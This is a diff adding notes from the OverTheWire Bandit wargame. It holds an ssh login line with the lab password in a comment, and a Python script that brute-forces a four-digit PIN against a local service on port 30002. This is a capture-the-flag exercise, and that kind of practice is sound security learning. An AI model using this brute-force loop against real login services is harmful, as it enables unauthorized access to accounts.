@@ -1,0 +1,40 @@
+ssh bandit24@bandit.labs.overthewire.org -p 2220 #VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+
+
+
+`import socket
+
+def connect_and_send():
+    host = 'localhost'
+    port = 30002
+
+    # Create a socket object
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        # Connect to the server
+        client_socket.connect((host, port))
+        print(f"Connected to {host} on port {port}")
+
+        # Loop from 1000 to 9999 and send each message
+        for number in range(1000, 10000):
+            message = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar " + str(number) + "\n"
+            client_socket.sendall(message.encode())
+
+            # Receive response from the server
+            response = client_socket.recv(1024).decode()
+
+            # Print response only if it is correct
+            if "Wrong" not in response:
+                print(f"Response: {response}")
+
+    except ConnectionError as e:
+        print(f"Connection error: {e}")
+    finally:
+        # Close the connection
+        client_socket.close()
+        print("Connection closed")
+
+if __name__ == "__main__":
+    connect_and_send()`
